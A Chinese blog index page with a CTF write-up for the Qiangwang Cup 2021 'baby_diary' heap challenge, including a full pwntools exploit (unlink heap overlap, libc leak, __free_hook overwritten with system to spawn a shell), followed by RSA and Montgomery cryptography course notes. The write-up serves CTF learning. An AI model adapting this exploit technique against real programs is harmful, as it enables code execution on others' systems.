<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"hornos3.github.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="CoLin&#39;s BLOG">
<meta property="og:url" content="http://hornos3.github.com/page/5/index.html">
<meta property="og:site_name" content="CoLin&#39;s BLOG">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="CoLin">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://hornos3.github.com/page/5/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-cn'
  };
</script>

  <title>CoLin's BLOG</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">CoLin's BLOG</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94baby-diary/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2021-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94baby-diary/" class="post-title-link" itemprop="url">强网杯2021 pwn 赛题解析——baby_diary</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 23:01:56" itemprop="dateCreated datePublished" datetime="2023-02-28T23:01:56+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:31:36" itemprop="dateModified" datetime="2023-03-01T11:31:36+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/%E5%85%B6%E4%BB%96/" itemprop="url" rel="index"><span itemprop="name">其他</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>4.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这是一道经典的堆题，可以写入、读取和删除。其中最值得研究的就是write函数最后调用的一个函数，其中涉及几个迷之计算。</p>
<h1 id="Step-1-漏洞分析"><a href="#Step-1-漏洞分析" class="headerlink" title="Step 1: 漏洞分析"></a>Step 1: 漏洞分析</h1><p><img src="1.png" alt=""><br>我们进入unknown_handle函数（名字是笔者自己起的）：<br><img src="2.png" alt=""><br>后面有一个unknown_cal函数，这个函数对输入的字符串进行了一系列的操作。首先将各个字符取出将它们的ASCII码全加起来保存到一个变量a中，然后循环进行下面的计算：如果a大于0xF，计算<code>a = (a &gt;&gt; 4) + (a &amp; 0xF)</code>直到a小于0xF为止。返回到unknown_handle函数中，这里对字符串的后面一位进行了修改。但write函数一开始会要求输入size，申请的空间大小是size+1，这就需要注意read_buf这个函数了。当循环退出的时候，i的值应该就是max_len，此时后面的<code>buf[i]=0</code>实际上已经相对于max_len溢出了一个字节。因此unknown_handle函数中最后一条语句实际上相对于size溢出了2个字节。这可能会修改到下一个chunk的size。<br><img src="3.png" alt=""><br><img src="4.png" alt=""></p>
<p>本题还存在数组溢出漏洞。</p>
<p>请注意read函数，其中并没有对index进行检查，而在check_terminator函数中，存在有整型溢出漏洞，当index为负数时有可能通过检查。<br><img src="5.png" alt=""><br><img src="6.png" alt=""><br>但在数组溢出之后，想让check_terminator函数返回true并不容易，需要匹配结束符的ASCII码。</p>
<p>同样地，delete函数中也存在整型溢出漏洞，但如果对应地址不是有效的堆地址，就会直接报错，因此这里也不好利用：<br><img src="7.png" alt=""></p>
<h1 id="Step-2-确定利用方式，调试编写exp"><a href="#Step-2-确定利用方式，调试编写exp" class="headerlink" title="Step 2: 确定利用方式，调试编写exp"></a>Step 2: 确定利用方式，调试编写exp</h1><p>这里需要注意unknown_handle函数时如何溢出一个字节的。在最后一条语句中，unknown_handle函数只会修改这个溢出字节的最低4位，最高4位不变。而堆管理中正常情况下所有的堆块大小都是以整0x10的形式保存的，即所有堆块的大小都是0x10的倍数。因此仅仅依靠一个字节的溢出无法达到堆块重叠的目的。</p>
<p>这里参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/eeeeeight/article/details/118006138?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=baby%20diary&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-118006138.142^v33^control,185^v2^control&amp;spm=1018.2226.3001.4187">这篇文章</a>的思路，利用large bin进行中转。当large bin中只有一个chunk时，其四个指针fd、bk、fd_nextsize、bk_nextsize有fd=bk在main_arena，fd_nextsize=bk_nextsize就是chunk自身。<br><img src="8.png" alt=""><br>当我们再一次分配到这一块内存空间时，我们就可以对这里面残留的4个指针进行改写，将其伪造成一个假chunk，这个chunk的fd指针就是原来的fd_nextsize指针，bk指针就是原来的bk_nextsize指针，将原来的bk指针改为合适的size，准备进行unlink操作。unlink操作最为关键的就是假chunk中两个指针的值，fd需要等于假chunk-0x18，bk需要等于假chunk-0x10。前面说过当large bin中仅有一个chunk时，其fd_nextsize和bk_nextsize均指向其自身，因此这里的<font color=red>bk不需要修改，但fd需要修改。</font><strong>注意：这里需要一定的爆破：由于写入时会在后面加上零字节和标志位，因此需要爆破chunk地址的其中8位，成功率为1/256：</strong><br><img src="9.png" alt=""><br>在爆破成功之后，我们就通过unlink实现了堆块重叠，申请合适的大小就可以使得main_arena的地址可以被其他chunk所读取。</p>
<p>在获取libc地址后，我们还是利用堆块重叠这一特性，修改tcache的指向到__free_hook，将其改为system地址。然后释放堆块即可。</p>
<p><strong><font color=red>需要注意的是：假chunk头部应该写的是假chunk的地址而不应该是其他值，因为unlink_chunk函数中那个<code>fd-&gt;bk=p || bk-&gt;fd=p</code>这个检查中p是一个指针。因此我们还需要想办法让这里的值变成假chunk的地址</font></strong>。前面说过，我们通过切割large bin chunk可以获得两个地址，然后我们要改写其中一个地址。改写之后我们再一次释放这个chunk，这时这个chunk会进入到<strong>fastbin</strong>中，这就有可能会在假chunk头部写上一个有效的地址。我们只需要将这个chunk重新分配回来，修改这个地址，就有可能满足unlink的检查条件。（<font color=red>注意：不能让chunk进入tcache的原因是tcache chunk的bk指针实际指向tcache那个结构体，因此会破坏假chunk的结构，覆盖我们写入的size值，导致unlink在检查size时就失败</font>）</p>
<p>另外，对于最初进入large bin的chunk的大小也有讲究。在第一次写假chunk信息时，我们需要写入一个size的值，而这个size的值会影响到最后的校验位。如果size的值设置得不正确，那么第一次写入和第二次写入计算出来的校验位就会不一样，这样是不可能利用成功的。因为第一次写入影响的是假chunk的fd指针，第二次写入影响的是假chunk地址本身，二者的校验位必须相等才可能使得unlink的检查通过。经过验证，这里的假chunk的size可以写0x800，但是不能写0x700、0x600等值。</p>
<p>exp如下，平均需要爆破约350次，这和爆破的期望不符，原因暂时不明。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./baby_diary&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_diary</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_diary</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_diary</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">flag = <span class="literal">True</span></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(flag):</span><br><span class="line">    write_diary(<span class="number">0x1070</span> - <span class="number">0x290</span> - <span class="number">0x10</span> + <span class="number">0x4000</span>, <span class="string">b&#x27;\n&#x27;</span>)      <span class="comment"># chunk #0</span></span><br><span class="line">    write_diary(<span class="number">0x810</span> - <span class="number">0x30</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\n&#x27;</span>)                 <span class="comment"># chunk #1</span></span><br><span class="line">    write_diary(<span class="number">0x20</span>, <span class="string">b&#x27;\n&#x27;</span>)                                <span class="comment"># chunk #2</span></span><br><span class="line">    delete_diary(<span class="number">1</span>)</span><br><span class="line">    write_diary(<span class="number">0x800</span>, <span class="string">b&#x27;\n&#x27;</span>)                               <span class="comment"># chunk #1, previous chunk #1 to large bin</span></span><br><span class="line">    write_diary(<span class="number">0x20</span>, p64(<span class="number">0x10</span>) + p64(<span class="number">0x800</span>) + <span class="string">b&#x27;\x68\n&#x27;</span>)   <span class="comment"># chunk #3</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        write_diary(<span class="number">0x20</span>, <span class="string">b&#x27;flag\n&#x27;</span>)                        <span class="comment"># chunk #4~6</span></span><br><span class="line">    write_diary(<span class="number">0x6B0</span>, <span class="string">b&#x27;\n&#x27;</span>)                               <span class="comment"># chunk #7</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        write_diary(<span class="number">0x20</span>, <span class="string">b&#x27;flag\n&#x27;</span>)                        <span class="comment"># chunk #8~10</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        write_diary(<span class="number">0x20</span>, <span class="string">b&#x27;\n&#x27;</span>)                            <span class="comment"># chunk #11~17</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete_diary(<span class="number">11</span>+i)                                  <span class="comment"># to tcache</span></span><br><span class="line"></span><br><span class="line">    delete_diary(<span class="number">4</span>)</span><br><span class="line">    delete_diary(<span class="number">3</span>)                                         <span class="comment"># write the chunk_addr to fake chunk&#x27;s header</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        write_diary(<span class="number">0x20</span>, <span class="string">b&#x27;\n&#x27;</span>)                            <span class="comment"># empty tcache, chunk #3, #4, #11~15</span></span><br><span class="line"></span><br><span class="line">    write_diary(<span class="number">0x20</span>, <span class="string">b&#x27;\x80\n&#x27;</span>)                            <span class="comment"># chunk #16, change the chunk address</span></span><br><span class="line">    delete_diary(<span class="number">2</span>)</span><br><span class="line">    write_diary(<span class="number">0x27</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x27</span>)                       <span class="comment"># chunk #2, change the prev_inuse bit of chunk #1</span></span><br><span class="line">    delete_diary(<span class="number">2</span>)</span><br><span class="line">    write_diary(<span class="number">0x27</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x18</span> + p64(<span class="number">8</span>) + <span class="string">b&#x27;\n&#x27;</span>)      <span class="comment"># chunk #2, change the prev_size of chunk #2 to 0x500</span></span><br><span class="line">    delete_diary(<span class="number">1</span>)                                         <span class="comment"># trigger unlink</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        write_diary(<span class="number">0x40</span>, <span class="string">b&#x27;deadbeef\n&#x27;</span>)                    <span class="comment"># chunk #1</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        io.close()</span><br><span class="line">        io = process(<span class="string">&#x27;./baby_diary&#x27;</span>)</span><br><span class="line">        counter += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(counter)</span><br><span class="line"></span><br><span class="line">read_diary(<span class="number">5</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">__malloc_hook = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line">base = __malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">__free_hook = base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(__free_hook))</span><br><span class="line"></span><br><span class="line">write_diary(<span class="number">0x20</span>, <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete_diary(<span class="number">12</span>)</span><br><span class="line">delete_diary(<span class="number">6</span>)</span><br><span class="line">write_diary(<span class="number">0x50</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(__free_hook) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">write_diary(<span class="number">0x20</span>, <span class="string">b&#x27;/bin/sh\n&#x27;</span>)</span><br><span class="line">write_diary(<span class="number">0x20</span>, p64(system) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">delete_diary(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="10.png" alt=""></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-5%E2%80%94%E2%80%94%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-5%E2%80%94%E2%80%94%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E4%BD%93%E5%88%B6/" class="post-title-link" itemprop="url">密码学基础 Chapter 5——公钥密码体制</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 23:00:16" itemprop="dateCreated datePublished" datetime="2023-02-28T23:00:16+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:31:34" itemprop="dateModified" datetime="2023-03-01T11:31:34+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">课内笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BE%E5%86%85%E7%AC%94%E8%AE%B0/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">密码学基础</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>8.7k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="公钥密码体制"><a href="#公钥密码体制" class="headerlink" title="公钥密码体制"></a>公钥密码体制</h1><h2 id="对称密钥的三大问题"><a href="#对称密钥的三大问题" class="headerlink" title="对称密钥的三大问题"></a>对称密钥的三大问题</h2><ol>
<li>密钥交换</li>
<li>密钥管理：每两个用户之间的密钥都不相同</li>
<li>抵赖行为：不承认发送过某条消息</li>
</ol>
<h2 id="单向陷门函数"><a href="#单向陷门函数" class="headerlink" title="单向陷门函数"></a>单向陷门函数</h2><p>希望可以找到一个密码体制，对于给定的加密e~k~，除了消息接受者，求d~k~在计算上不可行。其中e~k~可公开，无需分享密钥。<br>单向函数：一个函数容易计算但求逆困难。（还没有一个函数没证明单向）<br>单向陷门函数：存在一个单向函数，该函数在具有特定知识（称为陷门）后容易求逆</p>
<h2 id="单向函数定义"><a href="#单向函数定义" class="headerlink" title="单向函数定义"></a>单向函数定义</h2><p>假定n=pq（p、q为不同的大素数），b为正整数，定义f：Z~n~→Z~n~，f(x)=x^b^ mod n<br>陷门：大数n的因式分解<br>若已知n的因式分解n=pq，则$\varphi(n)$=(p-1)(q-1)<br>若gcd(b,φ(n))=1，且ab$\equiv$ 1 mod φ(n)<br>f^-1^：Z~n~→Z~n~，f^-1^(x)=x^a^ mod n</p>
<h2 id="公钥密码使用方式"><a href="#公钥密码使用方式" class="headerlink" title="公钥密码使用方式"></a>公钥密码使用方式</h2><p>用于加密：公钥加密私钥解密，无需交换密钥<br>用于认证：防止抵赖，如果要证明某文件为自己生成，则可以使用自己的私钥加密，其他人接收到之后通过公钥验证签名，用手中的所有公钥尝试，使用谁的公钥能够解密就是谁生成的文件</p>
<h1 id="RSA算法"><a href="#RSA算法" class="headerlink" title="RSA算法"></a>RSA算法</h1><h2 id="数学基础"><a href="#数学基础" class="headerlink" title="数学基础"></a>数学基础</h2><p>欧拉定理：$(a,n)=1,a^{\varphi(n)}\equiv 1\pmod n$<br>费马小定理：$a^p\equiv a\pmod p$</p>
<h2 id="密码算法"><a href="#密码算法" class="headerlink" title="密码算法"></a>密码算法</h2><p>n=pq，K={(n,p,q,e,d): ed$\equiv$ 1 mod φ(n)}<br>定义$e_k(x)=x^e\pmod n,d_k(y)=y^d\pmod n,(x,y\in Z_n)$，(n,e)为公钥，(n,d)为私钥</p>
<h2 id="参数生成"><a href="#参数生成" class="headerlink" title="参数生成"></a>参数生成</h2><p>素性检测、公私钥对<br>加解密过程的快速实现：</p>
<ul>
<li>平方-乘算法</li>
<li>蒙哥马利算法</li>
<li>中国剩余定理加速解密<h3 id="平方-乘算法"><a href="#平方-乘算法" class="headerlink" title="平方-乘算法"></a>平方-乘算法</h3>要计算$a^b\mod n$：<script type="math/tex; mode=display">b=\sum_{i=0}^{l-1}b_i2^i,b_i\in\{0,1\},b_{l-1}=1\\
b=b_{l-1}2^{l-1}+b_{l-2}2^{l-2}+...+b_1\cdot 2+b_0\\
=2(2(...(2(b_{l-1})+b_{l-2})+...)+b_1)+b_0\\
a^b=a^{\sum_{i=0}^{l-1}b_i2^i}=(((...(1\times a^{b_{l-1}})^2\times a^{b_{l-2}})^2\times ...)^2\times a^{b_1})^2\times a^{b_0}</script>（实际上就是模平方重复法的变体）<br><img src="1.jpeg" alt=""><br>如上图示例：<br>9726^2^ $\equiv$ 2659(mod 11413)<br>2659^2^ $\equiv$ 5634(mod 11413)</li>
</ul>
<h3 id="蒙哥马利算法"><a href="#蒙哥马利算法" class="headerlink" title="蒙哥马利算法"></a>蒙哥马利算法</h3><p><strong>蒙哥马利变换</strong><br>d=2^32^，2^64^，假设d=2^32^<br>模N：：k=32n比特奇数，IN=-N^-1^ mod 2^32^<br>R=d^n^&gt;N，(R,N)=1，a,b∈Z~N~<br>A=Mont(a) = aR mod N<br>MontInv(A) = AR^-1^ mod N<br>MontInv(Mont(a)) = a mod N</p>
<p>A = Mont(a), B = Mont(b)<br>MontMult(A,B)=ABR^-1^ = aRbRR^-1^ = abR mod N = Mont(ab mod N)<br>MontMult(A,MontMult(A,A))=Mont(a^3^ mod N)</p>
<p>MontMult(A,B) = ABR^-1^ mod N<br>T = AB, 2n位整数，T=(0t~2n-1~t~2n-2~…t~1~t~0~)<br>计算T’=T+N×((t~0~×IN) mod 2^32^)<br>(1) T’ = T mod N<br>(2) T’ = t~0~+(N×IN)t~0~ = 0 mod 2^32^<br>(3) T’ &gt;&gt; 32, T’ = T×2^32^ mod N<br>令T=T’, 重复上述步骤n次，T×2^-32n^ = TR^-1^ mod N<br>T’ = (0ct~n-1~’t~n-2~’…t~0~’)，如果T’&gt;N，返回T’-N，否则返回T’=(t~n-1~’t~n-2~’…t~0~’)</p>
<p>快速模幂运算a^e^ mod N</p>
<h3 id="中国剩余定理"><a href="#中国剩余定理" class="headerlink" title="中国剩余定理"></a>中国剩余定理</h3><p>把解密时的一个式子拆成两个式子来算（模p和q）</p>
<h3 id="素数定理"><a href="#素数定理" class="headerlink" title="素数定理"></a>素数定理</h3><script type="math/tex; mode=display">\pi(N)\approx\frac{N}{\ln N}</script><p>若n=pq，为1024比特，则p,q为512比特<br>$\frac{1}{\ln 2^{512}}\approx\frac{1}{355}$（为素数的概率）</p>
<h3 id="素性检测"><a href="#素性检测" class="headerlink" title="素性检测"></a>素性检测</h3><p><strong>费马素性检测</strong>：若p为素数，(a,p)=1，则a^p-1^ = 1 mod p</p>
<p><strong>伪素数</strong>：设n为奇合数，如果整数b，(b,n)=1，使得b^n-1^=1 mod n，则称n为对于基b的伪素数</p>
<p><strong>Euler伪素数</strong>：设n为正奇合数，整数b，(b,n)=1，满足$b^{\frac{p-1}{2}}\equiv (\frac{b}{n})\mod n$，称n为对于基b的Euler伪素数</p>
